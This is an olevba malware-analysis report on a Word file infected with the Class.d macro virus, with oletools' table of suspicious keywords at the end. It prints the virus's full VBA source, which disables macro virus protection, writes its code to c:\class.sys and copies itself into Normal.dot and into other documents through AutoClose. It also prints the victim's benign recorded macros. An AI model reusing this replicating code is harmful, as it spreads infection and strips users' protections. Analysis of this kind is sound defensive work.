olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-77eab0acfd08f46555ae88481bc24102984dae80
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-77eab0acfd08f46555ae88481bc24102984dae80 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
On Error GoTo out
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
Options.VirusProtection = False
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
Options.SaveNormalPrompt = False
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
Options.ConfirmConversions = False
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If nt > 70 And ad > 0 Then GoTo out
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If nt < 70 Then
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End If
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
host.codemodule.AddFromFile ("c:\class.sys")
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
With host.codemodule
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    For x = 1 To 4
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    .deletelines 1
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    Next x
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End With
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If nt < 70 Then
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    With host.codemodule
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    .replaceline 1, "Sub AutoClose()"
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    .replaceline 91, "Sub ToolsMacro()"
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    For x = 70 To 81
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
        .deletelines 62
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    Next x
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    .replaceline 35, "    For x = 1 To 4"
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    End With
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End If
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
With host.codemodule
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    For x = 2 To 104 Step 2
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
    Next x
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End With
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
out:
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End Sub
'Johnna M. Blackhair8/27/99 1:23:11 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
Sub ToolsMacro()
'Johnna M. Blackhair8/27/99 1:23:12 PMHP LaserJet IIISi on LPT1:Diane's Letter Head
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Class.d-77eab0acfd08f46555ae88481bc24102984dae80 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro1()
Attribute Macro1.VB_Description = "Macro recorded 01/05/98 by Valued Gateway 2000 Customer"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"
'
' Macro1 Macro
' Macro recorded 01/05/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Coastal Oil & Gas Corp."
    Selection.MoveRight Unit:=wdCell
End Sub
Sub Macro2()
Attribute Macro2.VB_Description = "Macro recorded 01/05/98 by Valued Gateway 2000 Customer"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"
'
' Macro2 Macro
' Macro recorded 01/05/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Enron Oil & Gas Co."
    Selection.MoveRight Unit:=wdCell
    CommandBars("Stop Recording").Visible = False
End Sub
Sub eaMACROPETRO()
Attribute eaMACROPETRO.VB_Description = "Macro recorded 02/17/98 by Valued Gateway 2000 Customer"
Attribute eaMACROPETRO.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.eaMACROPETRO"
'
' eaMACROPETRO Macro
' Macro recorded 02/17/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Petroglyph Operating co."
    Selection.MoveRight Unit:=wdCell
End Sub
Sub Snyder()
Attribute Snyder.VB_Description = "Macro recorded 02/18/98 by Valued Gateway 2000 Customer"
Attribute Snyder.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Snyder"
'
' Snyder Macro
' Macro recorded 02/18/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Snyder Oil Corporation"
    Selection.TypeParagraph
End Sub
Sub UIT()
Attribute UIT.VB_Description = "Macro recorded 02/18/98 by Valued Gateway 2000 Customer"
Attribute UIT.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.UIT"
'
' UIT Macro
' Macro recorded 02/18/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Ute Indian Tribe"
    Selection.TypeParagraph
End Sub
Sub CX()
Attribute CX.VB_Description = "Macro recorded 02/18/98 by Valued Gateway 2000 Customer"
Attribute CX.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.CX"
'
' CX Macro
' Macro recorded 02/18/98 by Valued Gateway 2000 Customer
'
    Selection.TypeText Text:="Categorical Exclusion"
    Selection.TypeParagraph
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
